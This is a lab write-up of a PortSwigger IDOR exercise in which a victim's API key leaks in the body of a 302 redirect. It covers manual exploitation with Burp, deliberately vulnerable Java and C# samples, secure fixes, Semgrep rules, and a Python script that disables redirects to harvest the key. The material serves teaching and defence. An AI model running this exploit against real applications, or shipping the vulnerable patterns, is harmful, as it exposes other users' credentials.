---
title: "Lab 09: User ID controlled by request parameter with data leakage in redirect"
date: 2025-12-17
categories: [portswigger, access_control]
tags: [IDOR, redirect_leakage] 
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-17-lab07_access_control/
--- 

## 1. Executive Summary

**Vulnerability:** IDOR with Data Leakage in Redirect.

**Description:** The application detects an authorization failure (e.g., User A trying to access User B's data) and issues a `302 Found` redirect to the login or home page. However, the application fails to abort the generation of the restricted content. The sensitive data (API Key) is written into the response body *despite* the redirect status code.

**Impact:** Browsers automatically follow the redirect and discard the body, hiding the leak from the user. However, an attacker using a proxy (Burp Suite) can inspect the HTTP response and recover the sensitive data contained within the "302" response body.

## 2. The Attack

**Objective:** Steal the API key of `carlos` from the redirect body.

1. **Reconnaissance:** I logged in as `wiener` and accessed `/my-account`. The URL contained the parameter `id=wiener`.
2. **Exploitation:** I sent the request to **Burp Repeater**. I changed the parameter to `id=carlos`.
3. **Observation:** The server responded with `302 Found` (redirecting to `/home`).
    - *Normal Browser Behavior:* The browser sees "302", immediately requests `/home`, and shows the home page. The user thinks access was denied.
    - *Attacker Behavior:* I looked at the **Response Body** of the `302` response in Burp.
4. **Loot:** Despite the redirect, the HTML for Carlos's account page—including his API Key—was fully present in the response body.
5. **Submission:** I copied the key and solved the lab.

## 3. Code Review

**Vulnerability Analysis (Explanation):**
The flaw is a **Race Condition in Logic** or **Improper Error Handling**. The code executes the "Success Path" (fetching and rendering data) *before* or *simultaneously* with the "Failure Path" (redirecting).

- **The Flaw:** The server populates the response buffer with sensitive data *before* deciding to redirect the user.
- **The Reality:** In HTTP, a response can have both a Redirect Header (`Location: /home`) AND a Body. Browsers ignore the body; Proxies do not.

### Java (Legacy Servlet / JSP Pattern)

```java
@WebServlet("/my-account")
public class AccountServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        String id = req.getParameter("id");
        
        // 1. Fetch Sensitive Data
        User user = db.findUser(id);
        
        // 2. Write Data to Response Buffer
        // The developer thinks this is fine because they redirect later.
        PrintWriter out = resp.getWriter();
        out.println("<h1>Account: " + user.getUsername() + "</h1>");
        out.println("<p>API Key: " + user.getApiKey() + "</p>");
        
        // 3. Late Access Check
        // "Oh wait, is this the right user?"
        if (!user.getUsername().equals(req.getSession().getAttribute("user"))) {
            // VULNERABLE: sendRedirect sets the header, but does NOT clear the buffer 
            // or stop execution automatically in all containers.
            resp.sendRedirect("/home");
            
            // If we don't 'return' here, the sensitive data remains in the body!
        }
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`out.println(...)`**: This writes data into the server's response buffer. At this point, the API key is ready to be sent to the client.
- **`resp.sendRedirect("/home")`**: This sets the HTTP Status Code to `302` and adds the `Location` header.
- **The Mistake**: The developer assumes `sendRedirect` deletes the body or stops the script. In raw Servlets (and some MVC configurations), if the buffer isn't explicitly cleared or if execution isn't halted with `return`, the buffer (containing the key) is flushed to the client along with the redirect headers.

### C# (ASP.NET Core - Manual Response Manipulation)

```csharp
public async Task GetAccount(string id)
{
    var user = _repo.GetUser(id);

    // 1. Write sensitive data to the response stream directly
    // (Simulating a scenario where data is written before logic completes)
    await Response.WriteAsync($"API Key: {user.ApiKey}");

    // 2. Authorization Check
    if (User.Identity.Name != user.Username)
    {
        // VULNERABLE: We set the Redirect, but the 'WriteAsync' data is already committed or buffered.
        Response.Redirect("/home");
        // The response goes out as:
        // HTTP/1.1 302 Found
        // Location: /home
        // Body: API Key: ...
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`Response.WriteAsync(...)`**: Writes text directly to the HTTP response body.
- **`Response.Redirect("/home")`**: Changes the status code to 302.
- **Protocol Behavior**: HTTP protocols do not forbid a body in a 302 response. The server faithfully sends the status (Redirect) and the payload (API Key). The client (Browser) chooses to ignore the payload, but the client (Burp Suite) records it.

### Mock PR Comment

I noticed that in the `GetAccount` method, we are fetching the user data and writing it to the response *before* verifying if the user is authorized to see it.

Even though we call `redirect` later, the sensitive data is still sent in the HTTP response body. Attackers can ignore the redirect and read the data. Please move the Authorization check to the very top of the method, before any data is fetched or written.

## 4. The Fix

**Explanation of the Fix:**
The fix is **"Fail Fast."** We must check permissions *before* we touch the database and certainly *before* we write a single byte to the response.

### Secure Java

```java
protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
    String id = req.getParameter("id");
    String loggedInUser = (String) req.getSession().getAttribute("user");

    // SECURE: Check Authorization FIRST.
    // If they aren't the owner, redirect immediately and RETURN.
    if (!loggedInUser.equals(id)) {
        resp.sendRedirect("/home");
        return; // Stop execution. Nothing gets written to body.
    }

    // Only fetch data if authorized
    User user = db.findUser(id);
    // ... write response ...
}
```

**Technical Flow & Syntax Explanation:**

- **Early `if` check**: The logic compares the requested `id` with the `loggedInUser` immediately.
- **`return;`**: Crucial. This ensures that the method terminates immediately after sending the redirect. The code path that fetches the API key is never reached.

### Secure C#

```csharp
public IActionResult GetAccount(string id)
{
    // SECURE: Check ownership using Session/Claims first.
    var currentUserId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;

    if (currentUserId != id)
    {
        // Return a RedirectResult. 
        // This is a specific object that tells the framework "Stop here, send 302".
        return Redirect("/home");
    }

    // Data fetching happens only here, safely.
    var user = _repo.GetUser(id);
    return View(user);
}
```

**Technical Flow & Syntax Explanation:**

- **`IActionResult`**: We return a result object rather than writing to the stream manually.
- **`return Redirect(...)`**: In ASP.NET MVC, returning this result short-circuits the pipeline. The framework knows to send *only* the headers for the redirect and no body content (or a standard empty body). The vulnerable code path is unreachable.

## 5. Automation

*A Python script that exploits the vulnerability by disabling automatic redirects (`allow_redirects=False`) to catch the leaking 302 body.*

```python
#!/usr/bin/env python3
import argparse
import re
import requests
import sys

def exploit_redirect_leak(url, session_cookie, victim_id):
    target_path = "/my-account"
    params = {"id": victim_id}
    cookies = {"session": session_cookie}

    print(f"[*] Target: {url}{target_path}")
    print(f"[*] Victim ID: {victim_id}")
    print("[*] Sending request with allow_redirects=False...")

    try:
        # CRITICAL: We set allow_redirects=False. 
        # If True, requests would follow the 302 to the Home Page, and we'd miss the flag.
        resp = requests.get(
            f"{url.rstrip('/')}{target_path}", 
            params=params, 
            cookies=cookies, 
            allow_redirects=False, 
            timeout=10
        )
        
        print(f"[*] Status Code: {resp.status_code}")
        
        # We expect a 302 Redirect
        if resp.status_code == 302:
            print("[+] Redirect detected. Checking response body for leak...")
            
            # Search for API Key in the body of the redirect
            key_pattern = r"Your API Key is:\s*([A-Za-z0-9]+)"
            m = re.search(key_pattern, resp.text)
            
            if m:
                print(f"[!!!] SUCCESS! Leaked API KEY: {m.group(1)}")
            else:
                print("[-] No API key found in the redirect body.")
                # print(resp.text) # Uncomment to debug
        else:
            print("[-] Did not receive a 302 Redirect. Exploit might be failing or already fixed.")

    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

def main():
    ap = argparse.ArgumentParser(description="Exploit Data Leakage in Redirect")
    ap.add_argument("url", help="Base URL of the lab")
    ap.add_argument("session", help="Your valid session cookie")
    ap.add_argument("victim", help="The victim user ID (e.g., carlos)")
    
    args = ap.parse_args()
    exploit_redirect_leak(args.url, args.session, args.victim)

if __name__ == "__main__":
    main()
```

## 6. Static Analysis (Semgrep)

*These rules look for code patterns where a response is written to, or data is fetched, before a redirect command is issued in the same execution block.*

**The Logic**
We are looking for a function that:

1. Writes to the response (`PrintWriter`, `Response.Write`, etc.) OR fetches data.
2. *Then* calls `sendRedirect` or `Redirect`.
3. Does so inside a conditional that implies an error/auth check (e.g., `if (!valid)`).

### Java Rule

```yaml
rules:
  - id: java-sensitive-data-before-redirect
    languages: [java]
    message: |
      Possible Data Leak in Redirect. Data is written to the response 
      buffer before a sendRedirect() call. Ensure sensitive data is not 
      flushed to the client in the redirect body.
    severity: WARNING
    patterns:
      - pattern-inside: |
          public void $METHOD(..., HttpServletResponse $RESP) { ... }
      - pattern: |
          // Match writing to response first
          $WRITER.println(...);
          ...
          // Then redirecting
          $RESP.sendRedirect(...);
```

### C# Rule

```yaml
rules:
  - id: csharp-sensitive-data-before-redirect
    languages: [csharp]
    message: "Potential Data Leak: Response.WriteAsync called before Response.Redirect."
    severity: WARNING
    patterns:
      - pattern-inside: |
          public async Task $METHOD(...) { ... }
      - pattern: |
          await Response.WriteAsync(...);
          ...
          Response.Redirect(...);
```
